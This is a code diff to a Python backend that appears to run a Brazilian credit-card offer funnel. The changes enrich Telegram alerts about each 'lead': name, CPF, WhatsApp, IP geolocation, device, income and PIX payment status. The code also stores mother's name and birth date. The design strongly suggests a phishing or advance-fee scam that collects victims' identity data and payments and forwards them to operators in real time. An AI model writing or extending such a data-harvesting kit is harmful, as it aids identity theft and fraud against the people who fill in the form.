@@ -448,16 +448,28 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
                     geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country} (Ver Satélite)</a>"
             except: pass
 
-        texto = f"{icon} <b>RASTREAMENTO AVANÇADO DE LEAD</b> {icon}\n\n"
+        import datetime
+        agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
+
+        titulo = "RASTREAMENTO AVANÇADO DE LEAD"
+        if event_type == "ENTRY": titulo = "🟢 NOVO ACESSO IDENTIFICADO"
+        elif "ABANDONO" in event_type: titulo = "🚨 LEAD ABANDONOU O FUNIL"
+        
+        texto = f"{icon} <b>{titulo}</b> {icon}\n\n"
+        texto += f"🕒 <b>Data/Hora:</b> {agora}\n"
         texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
         texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
         if lead.get('whatsapp'):
             clean_wa = re.sub(r"\D", "", lead["whatsapp"])
-            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{clean_wa}'>{lead['whatsapp']}</a> ✅ (Validado)\n"
+            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{clean_wa}'>{lead['whatsapp']}</a> ✅\n"
+        
+        device = lead.get('device_brand') or 'Desconhecido'
+        texto += f"💻 <b>Dispositivo:</b> {device}\n"
         texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n"
         if geo_link != "N/A":
             texto += f"📍 <b>Localização:</b> {geo_link}\n"
-        texto += f"\n📊 <b>ETAPAS DO FUNIL (LIVE):</b>\n"
+            
+        texto += f"\n📊 <b>STATUS DO FUNIL:</b>\n"
         texto += f"✅ <b>Acesso Inicial:</b> Concluído\n"
         if lead['cpf']: texto += f"✅ <b>Validação CPF:</b> {lead['cpf']}\n"
         if lead['renda']: texto += f"✅ <b>Renda Informada:</b> R$ {lead['renda']}\n"
@@ -543,13 +555,36 @@ def send_telegram_report(session_id, is_paid=False):
     if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
         status_icon = "✅ PAGO"
         
-    texto = f"📊 <b>NOVA VENDA CONFIRMADA!</b>\n\n" if is_paid else f"📊 <b>NOVO LEAD GERADO!</b>\n\n"
+    import datetime
+    agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")
+
+    # Generate Geolocation link for report too
+    geo_link = "N/A"
+    if lead['ip'] and lead['ip'] not in ['127.0.0.1', 'localhost']:
+        try:
+            ip_data = requests.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
+            if ip_data.get('status') == 'success':
+                lat, lon = ip_data.get('lat'), ip_data.get('lon')
+                city, country = ip_data.get('city'), ip_data.get('country')
+                geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country}</a>"
+        except: pass
+
+    texto = f"📊 <b>NOVA VENDA CONFIRMADA!</b>\n\n" if is_paid else f"🚀 <b>PIX GERADO COM SUCESSO!</b>\n\n"
     texto += (
+        f"🕒 <b>Data/Hora:</b> {agora}\n"
         f"👤 <b>Nome:</b> {lead['nome']}\n"
         f"💳 <b>CPF:</b> <code>{lead['cpf']}</code>\n"
-        f"💰 <b>Renda Declarada:</b> {lead['renda']}\n"
-        f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado']}\n"
-        f"🎨 <b>Estilo Cartão:</b> {lead['card_style']} ({lead['card_color']})\n"
+    )
+    if lead.get('whatsapp'):
+        clean_wa = re.sub(r"\D", "", lead["whatsapp"])
+        texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{clean_wa}'>{lead['whatsapp']}</a>\n"
+    
+    texto += (
+        f"💰 <b>Renda Declarada:</b> R$ {lead['renda'] or 'Não inf.'}\n"
+        f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado'] or 'Não inf.'}\n"
+        f"🎨 <b>Estilo Cartão:</b> {lead['card_style'] or ''} ({lead['card_color'] or ''})\n"
+        f"💻 <b>Aparelho:</b> {lead.get('device_brand') or 'Desconhecido'}\n"
+        f"📍 <b>Local/IP:</b> <code>{lead['ip']}</code> - {geo_link}\n"
         f"🚚 <b>Status PIX:</b> {status_icon}\n"
     )
     if pay:
@@ -787,24 +822,28 @@ def api_lead():
     db = get_db()
 
     existing = db.execute("SELECT id FROM leads WHERE session_id=?", (sid,)).fetchone()
-    if existing:
-        db.execute("""
-            UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
-                renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
-                utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?, location=?,
-                updated_at=(cast(strftime('%s','now') as real))
-            WHERE session_id=?
-        """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
-              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
-    else:
-        db.execute("""
-            INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
-                renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
-                utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location,device_brand)
-            VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
-        """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
-              utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, device_brand))
-    db.commit()
+    try:
+        if existing:
+            db.execute("""
+                UPDATE leads SET cpf=?, nome=?, nome_mae=?, data_nasc=?,
+                    renda=?, tipo_renda=?, motivo_credito=?, dia_vencimento=?, limite_aprovado=?,
+                    utm_source=?, utm_medium=?, utm_campaign=?, utm_content=?, utm_term=?, src=?, sck=?, location=?,
+                    updated_at=(cast(strftime('%s','now') as real))
+                WHERE session_id=?
+            """, (cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite, 
+                  utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, sid))
+        else:
+            db.execute("""
+                INSERT INTO leads(session_id,ip,cpf,nome,nome_mae,data_nasc,
+                    renda,tipo_renda,motivo_credito,dia_vencimento,limite_aprovado,
+                    utm_source,utm_medium,utm_campaign,utm_content,utm_term,src,sck,location,device_brand)
+                VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+            """, (sid, client_ip, cpf, nome, nome_mae, data_nasc, renda, tipo_renda, motivo, dia_venc, limite,
+                  utm_source, utm_medium, utm_campaign, utm_content, utm_term, src, sck, client_loc, device_brand))
+        db.commit()
+    except Exception as e:
+        log.error("Error updating lead in DB: %s", e)
+        db.rollback()
     import threading
     try:
         send_telegram_notify(sid, "ENTRY")
